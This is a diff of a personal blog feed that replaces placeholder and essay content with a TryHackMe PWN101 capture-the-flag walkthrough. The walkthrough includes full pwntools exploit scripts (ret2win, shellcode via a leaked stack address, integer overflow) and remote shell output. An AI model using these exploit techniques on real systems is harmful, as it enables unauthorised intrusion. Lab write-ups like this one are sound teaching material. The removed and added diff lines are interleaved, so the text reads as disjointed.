-  &lt;li&gt;level 1 item
-    &lt;ul&gt;
-      &lt;li&gt;level 2 item&lt;/li&gt;
-      &lt;li&gt;level 2 item
-        &lt;ul&gt;
-          &lt;li&gt;level 3 item&lt;/li&gt;
-          &lt;li&gt;level 3 item&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;level 1 item
-    &lt;ul&gt;
-      &lt;li&gt;level 2 item&lt;/li&gt;
-      &lt;li&gt;level 2 item&lt;/li&gt;
-      &lt;li&gt;level 2 item&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;level 1 item
-    &lt;ul&gt;
-      &lt;li&gt;level 2 item&lt;/li&gt;
-      &lt;li&gt;level 2 item&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;level 1 item&lt;/li&gt;
-&lt;/ul&gt;
+<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span> 
+</code></pre></div></div>
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Long, single-line code blocks should not wrap. They should horizontally scroll if they are too long Long, single-line code blocks should not wrap. They should horizontally scroll if they are too long.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 get_shell.py REMOTE 10.10.145.112 9002
+<span class="o">[</span>+] Opening connection to 10.10.145.112 on port 9002: Done
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
+        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
+        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
+                 pwn 102          
 
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;The final element.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>VOiD | Ayush Panwar</name><email>mailto:ayushpanwar.qu@gmail.com</email></author><category term="jekyll" /><summary type="html">Text can be bold, italic, strikethrough or keyword</summary></entry><entry><title type="html">The Purpose of Education</title><link href="http://localhost:4000/new_blog/posts/the-purpose-of-education/" rel="alternate" type="text/html" title="The Purpose of Education" /><published>1948-12-12T10:18:00+00:00</published><updated>1948-12-12T10:18:00+00:00</updated><id>http://localhost:4000/new_blog/posts/the-purpose-of-education</id><content type="html" xml:base="http://localhost:4000/new_blog/posts/the-purpose-of-education/">&lt;p&gt;As I engage in the so-called “bull sessions” around and about the school, I too often find that most college men have a misconception of the purpose of education. Most of the “brethren” think that education should equip them with the proper instruments of exploitation so that they can forever trample over the masses. Still others think that education should furnish them with noble ends rather than means to an end.&lt;/p&gt;
+I need badf00d to fee1dead
+Am I right? Yes, I need c0ff33 to c0d3
+<span class="nv">$ </span><span class="nb">ls
+</span>flag.txt
+pwn102
+pwn102.c
+<span class="nv">$ </span><span class="nb">cat </span>flag.txt
+THM<span class="o">{</span>fake_flag<span class="o">}</span>   <span class="c"># get you own flag</span>
+</code></pre></div></div>
 
-&lt;p&gt;&lt;img src=&quot;https://picsum.photos/800/300&quot; alt=&quot;alt&quot; /&gt;&lt;/p&gt;
+<h2 id="challenge-3---pwn103">Challenge 3 - pwn103</h2>
 
-&lt;p&gt;It seems to me that education has a two-fold function to perform in the life of man and in society: the one is utility and the other is culture. Education must enable a man to become more efficient, to achieve with increasing facility the ligitimate goals of his life.&lt;/p&gt;
+<p>The challenge is running on port 9003</p>
 
-&lt;p&gt;Education must also train one for quick, resolute and effective thinking. To think incisively and to think for one’s self is very difficult. We are prone to let our mental life become invaded by legions of half truths, prejudices, and propaganda. At this point, I often wonder whether or not education is fulfilling its purpose. A great majority of the so-called educated people do not think logically and scientifically. Even the press, the classroom, the platform, and the pulpit in many instances do not give us objective and unbiased truths. To save man from the morass of propaganda, in my opinion, is one of the chief aims of education. Education must enable one to sift and weigh evidence, to discern the true from the false, the real from the unreal, and the facts from the fiction.&lt;/p&gt;
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># basic file checks</span>
 
-&lt;p&gt;The function of education, therefore, is to teach one to think intensively and to think critically. But education which stops with efficiency may prove the greatest menace to society. The most dangerous criminal may be the man gifted with reason, but with no morals.&lt;/p&gt;
+file pwn103.pwn103                                   
+pwn103.pwn103: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]<span class="o">=</span>3df2200610f5e40aa42eadb73597910054cf4c9f, <span class="k">for </span>GNU/Linux 3.2.0, not stripped
 
-&lt;p&gt;The late Eugene Talmadge, in my opinion, possessed one of the better minds of Georgia, or even America. Moreover, he wore the Phi Beta Kappa key. By all measuring rods, Mr. Talmadge could think critically and intensively; yet he contends that I am an inferior being. Are those the types of men we call educated?&lt;/p&gt;
 
-&lt;p&gt;We must remember that intelligence is not enough. Intelligence plus character–that is the goal of true education. The complete education gives one not only power of concentration, but worthy objectives upon which to concentrate. The broad education will, therefore, transmit to one not only the accumulated knowledge of the race but also the accumulated experience of social living.&lt;/p&gt;
+checksec pwn103.pwn103 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/kali/TryHackMe/PWN101/chall3/pwn103.pwn103'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
 
-&lt;p&gt;If we are not careful, our colleges will produce a group of close-minded, unscientific, illogical propagandists, consumed with immoral acts. Be careful, “brethren!” Be careful, teachers!&lt;/p&gt;</content><author><name>VOiD | Ayush Panwar</name><email>mailto:ayushpanwar.qu@gmail.com</email></author><category term="fiction" /><category term="jekyll" /><summary type="html">As I engage in the so-called “bull sessions” around and about the school, I too often find that most college men have a misconception of the purpose of education. Most of the “brethren” think that education should equip them with the proper instruments of exploitation so that they can forever trample over the masses. Still others think that education should furnish them with noble ends rather than means to an end.</summary></entry></feed>
+<span class="c"># Executing binary to get more info </span>
+
+./pwn103.pwn103
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠄⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄⠄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+
+  <span class="o">[</span>THM Discord Server]
+
+➖➖➖➖➖➖➖➖➖➖➖
+1<span class="o">)</span> 📢 Announcements
+2<span class="o">)</span> 📜 Rules
+3<span class="o">)</span> 🗣  General
+4<span class="o">)</span> 🏠 rooms discussion
+5<span class="o">)</span> 🤖 Bot commands
+➖➖➖➖➖➖➖➖➖➖➖
+⌨️  Choose the channel: 
+
+<span class="c"># checking different options for finding vuln</span>
+
+Choose the channel: 3
+
+🗣  General:
+
+<span class="nt">------</span><span class="o">[</span>jopraveen]: Hello pwners 👋
+<span class="nt">------</span><span class="o">[</span>jopraveen]: Hope youre doing well 😄
+<span class="nt">------</span><span class="o">[</span>jopraveen]: You found the vuln, right? 🤔
+
+<span class="nt">------</span><span class="o">[</span>pwner]: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Try harder!!! 💪
+zsh: segmentation fault  ./pwn103.pwn103
+
+<span class="c"># overflow vuln detected here</span>
+</code></pre></div></div>
+
+<p>Ghidra Analysis give these two important functions</p>
+
+<p><img src="https://raw.githubusercontent.com/VOiD-Ayush/new_blog/main/all_collections/_posts/images/pwn101/pwn103_admins_only.png" alt="pwn103_admins_only.png" /></p>
+
+<p><img src="https://raw.githubusercontent.com/VOiD-Ayush/new_blog/main/all_collections/_posts/images/pwn101/pwn103_general.png" alt="pwn103_general.png" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># important function</span>
+
+0x0000000000401554  admins_only
+
+
+pwndbg&gt; cyclic 100
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
+
+
+RBP  0x6161616a61616169 <span class="o">(</span><span class="s1">'iaaajaaa'</span><span class="o">)</span>
+RSP  0x7fffffffde08 ◂— <span class="s1">'kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'</span>
+
+<span class="c"># finding the overflow offset</span>
+pwndbg&gt; cyclic <span class="nt">-l</span> kaaa
+40
+
+</code></pre></div></div>
+
+<p>Our Exploit</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># /chall3/get_shell.py
+#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">exe</span> <span class="o">=</span> <span class="s">'./pwn103.pwn103'</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="c1"># context.log_level=''
+</span>
+<span class="c1"># Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>  <span class="c1"># Set GDBscript below
+</span>        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>  <span class="c1"># ('server', 'port')
+</span>        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>  <span class="c1"># Run locally
+</span>        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+
+<span class="c1"># Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
+gdb
+continue
+'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+
+<span class="c1">#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+
+<span class="n">padding</span> <span class="o">=</span> <span class="mi">40</span>
+<span class="n">admins_only</span> <span class="o">=</span> <span class="mh">0x0000000000401554</span>
+
+<span class="n">payload</span><span class="o">=</span><span class="n">flat</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s">"nop"</span><span class="p">)</span><span class="o">*</span><span class="n">padding</span><span class="p">,</span><span class="mh">0x401016</span><span class="p">,</span><span class="n">admins_only</span><span class="p">)</span>
+
+<span class="c1"># adding a return gadget in between to fix movaps issue
+# Thanks to Razvi for helping me to find this
+</span>
+<span class="n">write</span><span class="p">(</span><span class="s">"payload.txt"</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'3'</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"[pwner]:"</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">().</span><span class="n">decode</span><span class="p">())</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Running the payload</span>
+
+python3 get_shell.py REMOTE 10.10.145.112 9003
+<span class="o">[</span>+] Opening connection to 10.10.145.112 on port 9003: Done
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⡟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢹⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠄⢠⣴⣾⣵⣶⣶⣾⣿⣦⡄⠄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⢀⣾⣿⣿⢿⣿⣿⣿⣿⣿⣿⡄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⢸⣿⣿⣧⣀⣼⣿⣄⣠⣿⣿⣿⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠘⠻⢷⡯⠛⠛⠛⠛⢫⣿⠟⠛⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⣧⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢡⣀⠄⠄⢸⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣆⣸⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+
+  <span class="o">[</span>THM Discord Server]
+
+➖➖➖➖➖➖➖➖➖➖➖
+1<span class="o">)</span> 📢 Announcements
+2<span class="o">)</span> 📜 Rules
+3<span class="o">)</span> 🗣  General
+4<span class="o">)</span> 🏠 rooms discussion
+5<span class="o">)</span> 🤖 Bot commands
+➖➖➖➖➖➖➖➖➖➖➖
+⌨️  Choose the channel: 
+/home/kali/TryHackMe/PWN101/chall3/get_shell.py:47: BytesWarning: Text is not bytes<span class="p">;</span> assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  io.sendline<span class="o">(</span><span class="s1">'3'</span><span class="o">)</span>
+
+🗣  General:
+
+ 
+Try harder!!! 💪
+
+
+👮  Admins only:
+
+Welcome admin 😄
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+<span class="nv">$ </span><span class="nb">ls
+</span>flag.txt
+pwn103
+pwn103.c
+<span class="nv">$ </span><span class="nb">cat </span>flag.txt
+THM<span class="o">{</span>fake_flag<span class="o">}</span>   <span class="c"># get you own flag</span>
+</code></pre></div></div>
+
+<h2 id="challenge-4---pwn104">Challenge 4 - pwn104</h2>
+
+<p>Challenge is running on port 9004</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Basic file check </span>
+
+file pwn104.pwn104    
+pwn104.pwn104: ELF 64-bit LSB executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]<span class="o">=</span>60e0bab59b4e5412a1527ae562f5b8e58928a7cb, <span class="k">for </span>GNU/Linux 3.2.0, not stripped
+
+checksec pwn104.pwn104 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/kali/TryHackMe/PWN101/chall4/pwn104.pwn104'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+    RWX:      Has RWX segments
+
+<span class="c"># Running the file for more info</span>
+./pwn104.pwn104 
+       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
+        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
+        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
+                 pwn 104          
+
+I think I have some super powers 💪
+especially executable powers 😎💥
+
+Can we go <span class="k">for </span>a fight? 😏💪
+I<span class="s1">'m waiting for you at 0x7ffcb9eec270
+test
+
+</span></code></pre></div></div>
+
+<p>Again ghidra for analysis</p>
+
+<p><img src="https://raw.githubusercontent.com/VOiD-Ayush/new_blog/main/all_collections/_posts/images/pwn101/pwn104.png" alt="pwn104.png" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># finding the rip offset</span>
+
+RBP  0x6161617661616175 <span class="o">(</span><span class="s1">'uaaavaaa'</span><span class="o">)</span>
+RSP  0x7fffffffde28 ◂— 0x6161617861616177 <span class="o">(</span><span class="s1">'waaaxaaa'</span><span class="o">)</span>
+
+pwndbg&gt; cyclic <span class="nt">-l</span> waaa
+88
+
+</code></pre></div></div>
+
+<p>Our Exploit</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># /chall4/get_shell.py
+</span>
+<span class="c1">#!/usr/bin/env python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">exe</span> <span class="o">=</span> <span class="s">'./pwn104.pwn104'</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="c1"># context.log_level='debug'
+</span>
+<span class="c1"># Many built-in settings can be controlled on the command-line and show up
+# in "args".  For example, to dump all data sent/received, and disable ASLR
+# for all created processes...
+# ./exploit.py DEBUG NOASLR
+</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>  <span class="c1"># Set GDBscript below
+</span>        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>  <span class="c1"># ('server', 'port')
+</span>        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>  <span class="c1"># Run locally
+</span>        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+
+<span class="c1"># Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+</span><span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
+continue
+'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+
+<span class="c1">#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+
+<span class="n">padding</span> <span class="o">=</span> <span class="mi">88</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">sh</span><span class="p">())</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="nb">exit</span><span class="p">())</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'at '</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
+
+<span class="n">leaked_address</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+
+<span class="n">info</span><span class="p">(</span><span class="s">"leaked_address : %#x"</span><span class="p">,</span><span class="n">leaked_address</span><span class="p">)</span>
+
+<span class="n">payload</span><span class="o">=</span><span class="n">flat</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s">'nop'</span><span class="p">)</span><span class="o">*</span><span class="n">padding</span><span class="p">,</span><span class="n">leaked_address</span><span class="o">+</span><span class="mi">100</span><span class="p">,</span><span class="n">asm</span><span class="p">(</span><span class="s">'nop'</span><span class="p">)</span><span class="o">*</span><span class="mi">40</span><span class="p">,</span><span class="n">shellcode</span><span class="p">)</span>
+
+
+<span class="n">write</span><span class="p">(</span><span class="s">"payload.txt"</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Running the exploit</span>
+
+python3 get_shell.py REMOTE 10.10.145.112 9004
+<span class="o">[</span>+] Opening connection to 10.10.145.112 on port 9004: Done
+       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
+        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
+        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
+                 pwn 104          
+
+I think I have some super powers 💪
+especially executable powers 😎💥
+
+Can we go <span class="k">for </span>a fight? 😏💪
+I<span class="s1">'m waiting for you at 
+[*] leaked_address : 0x7ffd64d5ffd0
+[*] Switching to interactive mode
+$ ls
+flag.txt
+pwn104
+pwn104.c
+$ cat flag.txt
+THM{fake_flag}   # get you own flag
+
+</span></code></pre></div></div>
+
+<h2 id="challenge-5---pwn105">Challenge 5 - pwn105</h2>
+<p>The challenge is running on port 9005</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Basic file checks</span>
+
+file pwn105.pwn105    
+pwn105.pwn105: ELF 64-bit LSB pie executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]<span class="o">=</span>efe6d094462867e6b08e74de43fb7126e7b14ee4, <span class="k">for </span>GNU/Linux 3.2.0, not stripped
+
+checksec pwn105.pwn105 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/kali/TryHackMe/PWN101/chall5/pwn105.pwn105'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+
+<span class="c"># Running Binary to get more info</span>
+
+./pwn105.pwn105 
+       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
+        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
+        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
+                 pwn 105          
+
+
+<span class="nt">-------</span><span class="o">=[</span> BAD INTEGERS <span class="o">]=</span><span class="nt">-------</span>
+|-&lt; Enter two numbers to add <span class="o">&gt;</span>-|
+
+<span class="o">]&gt;&gt;</span> 4
+<span class="o">]&gt;&gt;</span> 5
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ADDING 4 + 5
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> RESULT: 9
+
+</code></pre></div></div>
+
+<p>Ghidra analysis</p>
+
+<p><img src="https://raw.githubusercontent.com/VOiD-Ayush/new_blog/main/all_collections/_posts/images/pwn101/pwn105.png" alt="pwn105.png" /></p>
+
+<p>So first it takes two inputs then check if the are +ve or not if they are not it tells you nice try else it will sum both the values and if the sum is less than 0 it pops a shell.</p>
+
+<p>Simple integer overflow can be done here as we know interger has range (-2,147,483,647 to 2,147,483,647) if we give the highest value and add something to it, the sum will go to the opposite side that is -ve one.</p>
+
+<p>lets try it out, it we enter 2147483647 and add 1 it theoretically it will become -2147483648</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc 10.10.145.112 9005                        
+       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
+        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
+        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
+                 pwn 105          
+
+
+<span class="nt">-------</span><span class="o">=[</span> BAD INTEGERS <span class="o">]=</span><span class="nt">-------</span>
+|-&lt; Enter two numbers to add <span class="o">&gt;</span>-|
+
+<span class="o">]&gt;&gt;</span> 2147483647
+<span class="o">]&gt;&gt;</span> 1
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> C: <span class="nt">-2147483648</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Popped Shell
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+<span class="nb">ls
+</span>flag.txt
+pwn105
+pwn105.c
+<span class="nb">cat </span>flag.txt
+THM<span class="o">{</span>fake_flag<span class="o">}</span>   <span class="c"># get you own flag</span>
+
+
+</code></pre></div></div>
+
+<h2 id="challenge-6---pwn106">Challenge 6 - pwn106</h2>
+<p>The challenge is running on port 9006</p>
+
